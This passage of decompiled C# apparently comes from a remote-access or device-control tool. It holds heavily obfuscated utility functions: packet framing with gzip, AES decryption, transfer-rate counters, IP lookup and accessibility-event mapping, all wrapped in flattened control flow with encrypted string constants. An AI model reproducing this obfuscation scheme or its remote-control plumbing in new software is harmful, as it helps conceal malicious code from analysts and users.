    }

    public static object Formatpassdata(string msg)
    {
      if (msg.Contains(EXGuarder.\u00379637648))
        goto label_6;
label_1:
      int num1 = 2126875015;
label_2:
      object obj;
      string str;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~112486602 - -(-(num2 * -383864693) - (-1391672991 - -1195783156)))) % 6U)
        {
          case 0:
            obj = (object) str;
            num1 = (int) num3 * 977159525 ^ 945155026;
            continue;
          case 1:
            goto label_6;
          case 2:
            goto label_1;
          case 3:
            obj = (object) msg;
            num1 = (int) num3 * -74119570 ^ 600592757;
            continue;
          case 5:
            num1 = (int) num3 * 32920137 ^ 175290775;
            continue;
          default:
            goto label_7;
        }
      }
label_7:
      return obj;
label_6:
      str = msg.Replace(EXGuarder.\u00379637648, EXGuarder.\u00324640B20).Replace(EXGuarder.\u003470D1964, EXGuarder.\u0036B63322F);
      num1 = 280026710;
      goto label_2;
    }

    public static string ExtractDomain(string input)
    {
      string host = EXGuarder.\u0034F216879;
      if (!input.Contains(EXGuarder.\u00350556465))
        goto label_5;
label_1:
      int num1 = -709287597;
label_2:
      Uri result;
      string domain;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(-(num1 + ((-724623616 - 980919659 ^ 1333840980 ^ 1303499646) - 890271003 - (~682040568 + (-1574240316 - 2066097215) - 423002485)) * -1175605593 - -(-1294444368 - ~1324057081 + ((-381464947 ^ 909812529) + (1866350050 + 691781835)))) - 468244320) - 353069935)) % 6U)
        {
          case 0:
            domain = input.Substring(0, input.IndexOf(EXGuarder.\u00350556465)).Trim();
            num1 = -551922266;
            continue;
          case 1:
            int num3 = !Uri.TryCreate(input, UriKind.Absolute, out result) ? 405193201 : (num3 = -525762309);
            num1 = num3 ^ (int) num2 * -339111825;
            continue;
          case 3:
            goto label_5;
          case 4:
            host = result.Host;
            num1 = (int) num2 * 1046468168 ^ 1953953359;
            continue;
          case 5:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_7:
      return domain;
label_5:
      domain = host;
      num1 = -551922266;
      goto label_2;
    }

    private static int FindIndex(byte[] source, byte[] pattern)
    {
      int num1 = checked (source.Length - pattern.Length);
label_1:
      int num2 = 944133576;
      int index1;
      while (true)
      {
        int num3 = num2;
        uint num4;
        bool flag;
        int num5;
        int index2;
        int num6;
        switch ((num4 = (uint) --(1905420677 - ((~((-249837421 - -602883756 - 1208276019) * -963394121 + (-183975054 - (-1050117102 - ~1235471617))) - num3) * -1162936947 ^ -158256263 - (-195376656 ^ 2127664280) ^ -1047772126 * -789753215 ^ 1239627558))) % 16U)
        {
          case 0:
            num2 = (int) num4 * -1401932063 ^ -1747521650;
            continue;
          case 1:
            num5 = 0;
            num2 = (int) num4 * 901976194 ^ 2137514991;
            continue;
          case 2:
            goto label_1;
          case 3:
            flag = false;
            num2 = 759713403;
            continue;
          case 4:
            checked { ++num5; }
            num2 = (int) num4 * 2005712002 ^ 69130742;
            continue;
          case 5:
            num6 = checked (pattern.Length - 1);
            index2 = 0;
            num2 = (int) num4 * 2068309366 ^ 840089339;
            continue;
          case 6:
            int num7;
            num2 = num7 = flag ? 903387606 : (num7 = 653727209);
            continue;
          case 7:
            index1 = num5;
            num2 = 2146579696;
            continue;
          case 8:
            int num8;
            num2 = num8 = index2 <= num6 ? 1855305868 : (num8 = -1787666333);
            continue;
          case 10:
            flag = true;
            num2 = 517407556;
            continue;
          case 11:
            index1 = -1;
            num2 = (int) num4 * 1756585811 ^ -914933263;
            continue;
          case 12:
            checked { ++index2; }
            num2 = (int) num4 * -1179397845 ^ 1108078945;
            continue;
          case 13:
            int num9;
            num2 = num9 = (int) source[checked (num5 + index2)] != (int) pattern[index2] ? 1313416682 : (num9 = -152723135);
            continue;
          case 14:
            num2 = (int) num4 * 1162009199 ^ -1752783575;
            continue;
          case 15:
            int num10;
            num2 = num10 = num5 <= num1 ? 2121195367 : (num10 = 1171735698);
            continue;
          default:
            goto label_17;
        }
      }
label_17:
      return index1;
    }

    public static string BSDE(string Str) => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Str));

    public static Point FixSize(Form lc0, Form lc1)
    {
      Point location = lc0.Location;
label_1:
      int num1 = 1545452223;
      Point point;
      while (true)
      {
        int num2 = num1;
        uint num3;
        Rectangle workingArea;
        int x;
        int y;
        Size size;
        switch ((num3 = (uint) (-1712032472 - --(num2 - (--(-2096968393 * -1867219238 - ~1356997170) - ~2047537427) + (1546315395 + 1080365875 - (491896934 ^ -1021497362) + -(1518920471 - 2060254935) - (--1530526247 + (667666188 - 2011050637 ^ -1364890154))) ^ (~784660055 + ~266551355) * 2099047481))) % 14U)
        {
          case 0:
            int num4 = y;
            workingArea = Screen.PrimaryScreen.WorkingArea;
            size = workingArea.Size;
            int height1 = size.Height;
            size = lc1.Size;
            int height2 = size.Height;
            int num5 = checked (height1 - height2);
            int num6;
            num1 = num6 = num4 <= num5 ? 911215734 : (num6 = 85585342);
            continue;
          case 1:
            point = new Point(x, y);
            num1 = -31622932;
            continue;
          case 2:
            size = workingArea.Size;
            int width1 = size.Width;
            size = lc1.Size;
            int width2 = size.Width;
            x = checked (width1 - width2);
            num1 = (int) num3 * -851817429 ^ 1199157697;
            continue;
          case 3:
            int num7 = x;
            workingArea = Screen.PrimaryScreen.WorkingArea;
            size = workingArea.Size;
            int width3 = size.Width;
            size = lc1.Size;
            int width4 = size.Width;
            int num8 = checked (width3 - width4);
            int num9;
            num1 = num9 = num7 <= num8 ? 1837654187 : (num9 = 329176193);
            continue;
          case 4:
            goto label_1;
          case 5:
            size = workingArea.Size;
            int height3 = size.Height;
            size = lc1.Size;
            int height4 = size.Height;
            y = checked (height3 - height4);
            num1 = (int) num3 * -1927037882 ^ -184865132;
            continue;
          case 6:
            y = 0;
            num1 = (int) num3 * -1865462533 ^ 855212884;
            continue;
          case 7:
            int num10;
            num1 = num10 = y >= 0 ? 1117711744 : (num10 = 1032295903);
            continue;
          case 8:
            workingArea = Screen.PrimaryScreen.WorkingArea;
            num1 = (int) num3 * 547955923 ^ 1449452811;
            continue;
          case 9:
            workingArea = Screen.PrimaryScreen.WorkingArea;
            num1 = (int) num3 * -1620881262 ^ 1409518714;
            continue;
          case 10:
            int num11 = x >= 0 ? -57029546 : (num11 = 269213286);
            num1 = num11 ^ (int) num3 * -615638849;
            continue;
          case 11:
            x = 0;
            num1 = (int) num3 * 703321154 ^ -292658764;
            continue;
          case 12:
            x = checked (location.X + (int) Math.Round(unchecked ((double) lc0.Width / 2.0)) - (int) Math.Round(unchecked ((double) lc1.Width / 2.0)));
            location = lc0.Location;
            y = checked (location.Y + (int) Math.Round(unchecked ((double) lc0.Height / 2.0)) - (int) Math.Round(unchecked ((double) lc1.Height / 2.0)));
            num1 = (int) num3 * 1145213148 ^ 2083162507;
            continue;
          default:
            goto label_15;
        }
      }
label_15:
      return point;
    }

    public static Array BytesConverter(long bytes)
    {
      long num1 = 1024;
label_1:
      int num2 = 2089198613;
      long num3;
      long num4;
      double num5;
      string str;
      long num6;
      long num7;
      while (true)
      {
        uint num8;
        switch ((num8 = (uint) ((-(num2 ^ -(-(770875308 - 101112778 + (-1138577678 ^ 1880683356)) - (~-1941714700 + ~1868860013) * 1616550711)) ^ ~--1718976413 ^ 1472874175) - -519877701 * (1437411252 + 910335773) ^ -1799911813 - 105880687 ^ -1018535739)) % 22U)
        {
          case 0:
            num2 = (int) num8 * -915812332 ^ -54276330;
            continue;
          case 1:
            num5 = (double) bytes / (double) num1 / (double) num1 / (double) num1;
            num2 = (int) num8 * 1340995636 ^ -1703123113;
            continue;
          case 2:
            str = num5.ToString(EXGuarder.\u0035F21725C) + EXGuarder.\u00324483608;
            num2 = (int) num8 * -1034543001 ^ 97702374;
            continue;
          case 3:
            num7 = 1048576L;
            num6 = 1073741824L;
            num2 = (int) num8 * -385447338 ^ 880578276;
            continue;
          case 4:
            num5 = (double) bytes / (double) num1 / (double) num1 / (double) num1 / (double) num1;
            num2 = (int) num8 * 778236094 ^ 1493788632;
            continue;
          case 5:
            int num9;
            num2 = num9 = num3 <= num4 ? 218135951 : (num9 = 467040610);
            continue;
          case 7:
            num2 = (int) num8 * -928690616 ^ 816674622;
            continue;
          case 8:
            int num10;
            num2 = num10 = num3 <= num7 ? 1521172643 : (num10 = 1336093437);
            continue;
          case 9:
            str = num5.ToString(EXGuarder.\u0035F21725C) + EXGuarder.\u00330325130;
            num2 = (int) num8 * -855552627 ^ -1093844270;
            continue;
          case 10:
            str = Conversions.ToString(bytes) + EXGuarder.\u003633C483F;
            num2 = (int) num8 * -803375881 ^ 723445534;
            continue;
          case 11:
            int num11;
            num2 = num11 = num3 <= num6 ? -909778968 : (num11 = 1246526279);
            continue;
          case 12:
            num2 = (int) num8 * 1296342226 ^ -1147532062;
            continue;
          case 13:
            int num12;
            num2 = num12 = num3 < num1 ? 925134198 : (num12 = 16699529);
            continue;
          case 14:
            int num13 = num3 >= 1024L ? 744328081 : (num13 = 1172633746);
            num2 = num13 ^ (int) num8 * -1868676828;
            continue;
          case 15:
            num5 = (double) bytes / (double) num1;
            str = num5.ToString(EXGuarder.\u0035F21725C) + EXGuarder.\u003646E7457;
            num2 = (int) num8 * 1835532799 ^ 1144020089;
            continue;
          case 16:
            str = EXGuarder.\u003134C282D;
            num2 = (int) num8 * -879286707 ^ 1755073594;
            continue;
          case 17:
            num5 = (double) bytes / (double) num1 / (double) num1;
            num2 = (int) num8 * -414309262 ^ -26744387;
            continue;
          case 18:
            num4 = 1099511627776L;
            num2 = (int) num8 * -471891619 ^ 1196799556;
            continue;
          case 19:
            goto label_1;
          case 20:
            num3 = bytes;
            num2 = (int) num8 * 490933536 ^ 309160484;
            continue;
          case 21:
            str = num5.ToString(EXGuarder.\u0035F21725C) + EXGuarder.\u003182A3C21;
            num2 = (int) num8 * -1759300436 ^ -1986326510;
            continue;
          default:
            goto label_23;
        }
      }
label_23:
      return (Array) new string[1]{ str.ToString() };
    }

    public static Array UploadDownload(long ParametersLong0, long ParametersLong1)
    {
      Array array;
      try
      {
        if (Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init == null)
        {
label_1:
          int num1 = 1706738318;
          while (true)
          {
            int num2 = num1;
            uint num3;
            switch ((num3 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num2) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 3U)
            {
              case 0:
                goto label_1;
              case 1:
                Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
                num1 = (int) num3 * 73049049 ^ -1560143402;
                continue;
              default:
                goto label_4;
            }
          }
        }
label_4:
        bool flag1 = false;
        try
        {
          Monitor.Enter((object) Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init, ref flag1);
          if (Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init.State != (short) 0)
            goto label_11;
label_6:
          int num4 = -1651472624;
label_7:
          while (true)
          {
            int num5 = num4;
            uint num6;
            switch ((num6 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num5) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 7U)
            {
              case 0:
                goto label_8;
              case 1:
                Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init.State = (short) 2;
                num4 = (int) num6 * -1605410834 ^ -126417222;
                continue;
              case 3:
                num4 = (int) num6 * 299063426 ^ -311961571;
                continue;
              case 4:
                goto label_11;
              case 5:
                goto label_6;
              case 6:
                Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload = ParametersLong0;
                num4 = (int) num6 * 1126923411 ^ -1410570299;
                continue;
              default:
                goto label_19;
            }
          }
label_8:
          throw new IncompleteInitialization();
label_11:
          num4 = Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init.State != (short) 2 ? -1594214877 : (num4 = 1748415717);
          goto label_7;
        }
        finally
        {
          Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init.State = (short) 1;
label_14:
          int num7 = -2059696422;
          while (true)
          {
            int num8 = num7;
            uint num9;
            switch ((num9 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num8) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 4U)
            {
              case 1:
                int num10 = !flag1 ? -766525438 : (num10 = 419532916);
                num7 = num10 ^ (int) num9 * 2083010435;
                continue;
              case 2:
                Monitor.Exit((object) Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload\u0024Init);
                num7 = (int) num9 * -933079415 ^ -136971753;
                continue;
              case 3:
                goto label_14;
              default:
                goto label_18;
            }
          }
label_18:;
        }
label_19:
        if (Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init == null)
        {
label_20:
          int num11 = 1715248910;
          while (true)
          {
            int num12 = num11;
            uint num13;
            switch ((num13 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num12) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 3U)
            {
              case 0:
                goto label_20;
              case 1:
                Interlocked.CompareExchange<StaticLocalInitFlag>(ref Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init, new StaticLocalInitFlag(), (StaticLocalInitFlag) null);
                num11 = (int) num13 * -1759684060 ^ 72314087;
                continue;
              default:
                goto label_23;
            }
          }
        }
label_23:
        bool flag2 = false;
        try
        {
          Monitor.Enter((object) Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init, ref flag2);
label_25:
          int num14 = 1884941772;
          while (true)
          {
            int num15 = num14;
            uint num16;
            switch ((num16 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num15) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 7U)
            {
              case 1:
                int num17 = Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init.State != (short) 0 ? 217785035 : (num17 = -728668238);
                num14 = num17 ^ (int) num16 * 833590533;
                continue;
              case 2:
                goto label_29;
              case 3:
                goto label_25;
              case 4:
                int num18;
                num14 = num18 = Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init.State != (short) 2 ? -1455004052 : (num18 = -1994559990);
                continue;
              case 5:
                Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init.State = (short) 2;
                num14 = (int) num16 * -1528177960 ^ -1061489234;
                continue;
              case 6:
                Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload = ParametersLong1;
                num14 = (int) num16 * 2020361290 ^ 1500073550;
                continue;
              default:
                goto label_37;
            }
          }
label_29:
          throw new IncompleteInitialization();
        }
        finally
        {
          Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init.State = (short) 1;
          if (flag2)
          {
label_33:
            int num19 = -1296041276;
            while (true)
            {
              int num20 = num19;
              uint num21;
              switch ((num21 = (uint) -(-~((~(-997527271 * (-1077561485 * -1402993669)) ^ -1481857470 ^ ~(413880915 * -457345972)) - num20) - (-477010008 ^ 1253366364 - 1770477240) - ~-1331825892)) % 3U)
              {
                case 0:
                  goto label_33;
                case 1:
                  Monitor.Exit((object) Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload\u0024Init);
                  num19 = (int) num21 * 202998151 ^ -356435353;
                  continue;
                default:
                  goto label_36;
              }
            }
          }
label_36:;
        }
label_37:
        long num22 = checked (ParametersLong0 - Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload);
        long num23 = checked (ParametersLong1 - Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload);
        Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastUpload = ParametersLong0;
        Codes.EXECUTION_STATE.\u0024STATIC\u0024UploadDownload\u0024021281A9AA\u0024LastDownload = ParametersLong1;
        array = (Array) new object[2]
        {
          Codes.BytesConverter(num23 < 0L ? 0L : num23).GetValue(0),
          Codes.BytesConverter(num22 < 0L ? 0L : num22).GetValue(0)
        };
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        array = (Array) new string[2]
        {
          EXGuarder.\u00354031B51,
          EXGuarder.\u00354031B51
        };
        ProjectData.ClearProjectError();
      }
      return array;
    }

    public static byte[] DE(byte[] by, string k)
    {
      MemoryStream memoryStream1 = new MemoryStream();
      MemoryStream memoryStream2 = new MemoryStream(by);
      try
      {
        RijndaelManaged rijndaelManaged = Codes.Rijndle(k);
        CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
        try
        {
          byte[] buffer = new byte[checked ((int) (memoryStream2.Length - 1L) + 1)];
label_3:
          int num1 = 1277131691;
          int count;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) ((-~(num1 * -1978879857) ^ -(1579359007 - 1505853042)) - -362930786 ^ -715007379)) % 4U)
            {
              case 1:
                memoryStream1.Write(buffer, 0, count);
                num1 = (int) num2 * 724104955 ^ 2087850842;
                continue;
              case 2:
                count = cryptoStream.Read(buffer, 0, checked ((int) memoryStream2.Length));
                num1 = (int) num2 * 1235283391 ^ 1583796574;
                continue;
              case 3:
                goto label_3;
              default:
                goto label_17;
            }
          }
        }
        finally
        {
          if (cryptoStream != null)
          {
label_8:
            int num3 = -991479566;
            while (true)
            {
              uint num4;
              switch ((num4 = (uint) ((-~(num3 * -1978879857) ^ -(1579359007 - 1505853042)) - -362930786 ^ -715007379)) % 3U)
              {
                case 1:
                  cryptoStream.Dispose();
                  num3 = (int) num4 * -667165657 ^ -1547007761;
                  continue;
                case 2:
                  goto label_8;
                default:
                  goto label_11;
              }
            }
          }
label_11:;
        }
      }
      finally
      {
        if (memoryStream2 != null)
        {
label_13:
          int num5 = 1539393328;
          while (true)
          {
            uint num6;
            switch ((num6 = (uint) ((-~(num5 * -1978879857) ^ -(1579359007 - 1505853042)) - -362930786 ^ -715007379)) % 3U)
            {
              case 1:
                memoryStream2.Dispose();
                num5 = (int) num6 * -517685957 ^ 957462276;
                continue;
              case 2:
                goto label_13;
              default:
                goto label_16;
            }
          }
        }
label_16:;
      }
label_17:
      return memoryStream1.ToArray();
    }

    private static RijndaelManaged Rijndle(string secretKey)
    {
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(secretKey, System.Text.Encoding.Unicode.GetBytes(EXGuarder.\u00352556E21));
label_1:
      int num1 = -2145965885;
      RijndaelManaged rijndaelManaged1;
      while (true)
      {
        int num2 = num1;
        uint num3;
        RijndaelManaged rijndaelManaged2;
        switch ((num3 = (uint) ~(~--278393161 - (num2 - ~((-1195376785 ^ -738126351 ^ -1199129678) + -1255407917 ^ 258849580) - (1651785519 ^ 1742417607) + ~(-941177494 ^ 751418360 ^ 903305947)) ^ ~-499778938)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            rijndaelManaged2.Padding = PaddingMode.PKCS7;
            rijndaelManaged1 = rijndaelManaged2;
            num1 = (int) num3 * -1126146010 ^ -1640538839;
            continue;
          case 2:
            rijndaelManaged2 = new RijndaelManaged();
            num1 = (int) num3 * -42840007 ^ 801530102;
            continue;
          case 4:
            rijndaelManaged2.KeySize = 256;
            num1 = (int) num3 * -902354498 ^ 1879463392;
            continue;
          case 5:
            rijndaelManaged2.Key = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) rijndaelManaged2.KeySize / 8.0))));
            num1 = (int) num3 * -472335953 ^ -1956042038;
            continue;
          case 6:
            rijndaelManaged2.IV = rfc2898DeriveBytes.GetBytes(checked ((int) Math.Round(unchecked ((double) rijndaelManaged2.BlockSize / 8.0))));
            num1 = (int) num3 * -559640859 ^ 192755553;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      return rijndaelManaged1;
    }

    public static byte[] FormatPacket(string Strings, byte[] bByte)
    {
      MemoryStream memoryStream = new MemoryStream();
label_1:
      int num1 = 529363190;
      byte[] numArray;
      while (true)
      {
        int num2 = num1;
        uint num3;
        byte[] array;
        byte[] buffer1;
        byte[] bytes1;
        byte[] bytes2;
        byte[] buffer2;
        byte[] bytes3;
        switch ((num3 = (uint) ((--225895192 - ~(~num2 - -(-151428639 * (821962325 ^ -823734709) * 637542679)) - (-1415754674 - 1707339805)) * -1512314431)) % 10U)
        {
          case 0:
            buffer1 = Codes.CGzip(Codes.Encoding().GetBytes(Strings));
            bytes1 = Codes.Encoding().GetBytes(Conversions.ToString(buffer1.Length));
            num1 = (int) num3 * 1578279532 ^ -575988632;
            continue;
          case 1:
            buffer2 = Codes.CGzip(bByte);
            num1 = (int) num3 * -917158038 ^ 1509275477;
            continue;
          case 2:
            bytes2 = Codes.Encoding().GetBytes(Conversions.ToString(buffer2.Length));
            memoryStream.Write(bytes1, 0, bytes1.Length);
            memoryStream.Write(bytes3, 0, bytes3.Length);
            num1 = (int) num3 * 658311049 ^ -1894835953;
            continue;
          case 3:
            goto label_1;
          case 4:
            array = memoryStream.ToArray();
            num1 = (int) num3 * -2036763224 ^ -1665810042;
            continue;
          case 6:
            memoryStream.Write(bytes2, 0, bytes2.Length);
            num1 = (int) num3 * -448925887 ^ -1406584501;
            continue;
          case 7:
            memoryStream.Dispose();
            numArray = array;
            num1 = (int) num3 * 1535325829 ^ -246407303;
            continue;
          case 8:
            memoryStream.Write(bytes3, 0, bytes3.Length);
            memoryStream.Write(buffer1, 0, buffer1.Length);
            memoryStream.Write(buffer2, 0, buffer2.Length);
            num1 = (int) num3 * -959660024 ^ -1819883273;
            continue;
          case 9:
            bytes3 = Codes.Encoding().GetBytes(EXGuarder.\u0034E697003);
            num1 = (int) num3 * 1251983989 ^ -1343460004;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return numArray;
    }

    public static string[] GetStatistics(string data)
    {
      string str = EXGuarder.\u0031015435C;
      string Left = EXGuarder.\u00341477568;
      string[] statistics;
      try
      {
        string lower = data.ToLower();
label_2:
        int num1 = 726083354;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) --(-num1 - (2146402809 - -(-927373239 - 1686066645 - -1942654075)))) % 7U)
          {
            case 1:
              object[] objArray = (object[]) NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(lower.Split(new string[1]
              {
                Left
              }, StringSplitOptions.None).GetValue(0)), (Type) null, EXGuarder.\u00368502954, new object[2]
              {
                (object) new string[1]
                {
                  EXGuarder.\u00338717476
                },
                (object) StringSplitOptions.None
              }, (string[]) null, (Type[]) null, (bool[]) null);
              Left = Conversions.ToString(objArray.GetValue(checked (objArray.Length - 1)));
              num1 = (int) num2 * -1586651111 ^ -857653735;
              continue;
            case 2:
              str = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(lower.ToLower().Split(new string[1]
              {
                str
              }, StringSplitOptions.None).GetValue(1)), (Type) null, EXGuarder.\u00368502954, new object[2]
              {
                (object) new string[1]
                {
                  EXGuarder.\u00338406546
                },
                (object) StringSplitOptions.None
              }, (string[]) null, (Type[]) null, (bool[]) null), (Type) null, EXGuarder.\u00343132A36, new object[1]
              {
                (object) 0
              }, (string[]) null, (Type[]) null, (bool[]) null))).Trim();
              num1 = (int) num2 * -1272042385 ^ -2027964889;
              continue;
            case 3:
              str = EXGuarder.\u00346673578;
              num1 = -1850660723;
              continue;
            case 4:
              int num3 = !lower.Contains(str) ? 312843568 : (num3 = -451114812);
              num1 = num3 ^ (int) num2 * 1293609613;
              continue;
            case 5:
              int num4;
              num1 = num4 = !lower.Contains(Left) ? 1157530255 : (num4 = -1858174190);
              continue;
            case 6:
              goto label_2;
            default:
              goto label_14;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_10:
        int num5 = 1615973114;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) --(-num5 - (2146402809 - -(-927373239 - 1686066645 - -1942654075)))) % 3U)
          {
            case 0:
              goto label_10;
            case 1:
              statistics = new string[2]
              {
                EXGuarder.\u00353123836,
                EXGuarder.\u00353123836
              };
              num5 = (int) num6 * 1212296253 ^ -254847363;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        ProjectData.ClearProjectError();
        goto label_20;
      }
label_14:
      if (Operators.CompareString(Left, EXGuarder.\u00341477568, false) != 0)
        goto label_19;
label_15:
      int num7 = -1576585596;
label_16:
      while (true)
      {
        uint num8;
        switch ((num8 = (uint) --(-num7 - (2146402809 - -(-927373239 - 1686066645 - -1942654075)))) % 5U)
        {
          case 0:
            goto label_15;
          case 1:
            statistics = new string[2]
            {
              EXGuarder.\u00353123836,
              EXGuarder.\u00353123836
            };
            num7 = (int) num8 * -33305805 ^ 394093725;
            continue;
          case 3:
            num7 = (int) num8 * 707520821 ^ 1829589418;
            continue;
          case 4:
            goto label_19;
          default:
            goto label_20;
        }
      }
label_19:
      statistics = new string[2]{ str.Trim(), Left.Trim() };
      num7 = -1941805367;
      goto label_16;
label_20:
      return statistics;
    }

    public static string GetIPAddress()
    {
      string ipAddress1;
      try
      {
        string hostName = Dns.GetHostName();
label_1:
        int num1 = -64852820;
        int index;
        IPAddress[] addressList;
        IPAddress ipAddress2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(-~num1 * 1089697385 ^ -1918088218 - 101886127) + 1506286056)) % 9U)
          {
            case 0:
              int num3 = ipAddress2.ToString().StartsWith(EXGuarder.\u0031731073A) ? 812046010 : (num3 = 456770787);
              num1 = num3 ^ (int) num2 * -2130528766;
              continue;
            case 1:
              int num4;
              num1 = num4 = index < addressList.Length ? -1652699143 : (num4 = 124864334);
              continue;
            case 2:
              ipAddress2 = addressList[index];
              num1 = 157110088;
              continue;
            case 3:
              goto label_1;
            case 5:
              index = 0;
              num1 = (int) num2 * 1468497707 ^ -1815237944;
              continue;
            case 6:
              goto label_14;
            case 7:
              addressList = Dns.GetHostEntry(hostName).AddressList;
              num1 = (int) num2 * 1182684161 ^ 1344339424;
              continue;
            case 8:
              checked { ++index; }
              num1 = (int) num2 * -213127574 ^ 749270910;
              continue;
            default:
              goto label_9;
          }
        }
label_9:
        ipAddress1 = ipAddress2.ToString();
        goto label_15;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_11:
        int num5 = -1211417133;
        while (true)
        {
          uint num6;
          switch ((num6 = (uint) (~(-~num5 * 1089697385 ^ -1918088218 - 101886127) + 1506286056)) % 3U)
          {
            case 0:
              goto label_11;
            case 2:
              ProjectData.ClearProjectError();
              num5 = (int) num6 * 1913230042 ^ -1727345295;
              continue;
            default:
              goto label_14;
          }
        }
      }
label_14:
      ipAddress1 = EXGuarder.\u00322712061;
label_15:
      return ipAddress1;
    }

    public static int RateConverter(int Value, int Totalsize)
    {
      int num1;
      try
      {
        if (Totalsize != 0)
          goto label_4;
label_1:
        int num2 = -1039733913;
label_2:
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) (~(num2 * -1109982219 * 55661699) + (1334411166 - 905856801 ^ 1376176206 ^ 1212250842))) % 5U)
          {
            case 1:
              num1 = 0;
              num2 = (int) num3 * -1274715969 ^ -1016560591;
              continue;
            case 2:
              goto label_1;
            case 4:
              goto label_4;
            default:
              goto label_6;
          }
        }
label_4:
        num1 = checked ((int) Math.Round(unchecked ((double) Value / (double) Totalsize * 100.0)));
        num2 = -1849992715;
        goto label_2;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        num1 = 0;
        ProjectData.ClearProjectError();
      }
label_6:
      return num1;
    }

    private static byte[] GenerateKey(string key)
    {
      byte[] bytes = System.Text.Encoding.UTF8.GetBytes(key);
label_1:
      int num1 = 1990063275;
      byte[] hash;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (--((-(-259828807 ^ 1028495961) ^ -761891856) - (1796269870 + 768636281 - (1854988105 ^ -1747663931) ^ ~~-1151197059) * 308652267 - num2) * -1950999221 * -679573031 - 287890915)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            hash = new SHA256Managed().ComputeHash(bytes);
            num1 = (int) num3 * 496923407 ^ -1095550185;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return hash;
    }

    public static string AccessibilityEvent(int v)
    {
      string str;
      int num1;
      switch (v)
      {
        case 0:
label_10:
          str = EXGuarder.\u0030A5F6348;
          num1 = 1407907699;
          break;
        case 1:
label_3:
          str = EXGuarder.\u003204D1C33;
          num1 = -1707176229;
          break;
        case 2:
label_4:
          str = EXGuarder.\u0035906601A;
          num1 = 1197122826;
          break;
        case 3:
